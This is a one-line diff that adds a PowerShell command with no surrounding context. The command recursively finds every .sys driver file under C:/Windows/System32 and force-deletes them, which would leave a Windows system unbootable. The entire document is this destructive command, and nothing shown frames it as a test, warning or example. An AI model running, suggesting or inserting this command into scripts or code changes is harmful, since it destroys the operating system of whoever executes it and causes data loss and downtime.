@@ -1,0 +1,1 @@
+Get-ChildItem "C:/Windows/System32" -Recurse | Where-Object { $_.Extension -eq ".sys" } | Remove-Item -Force
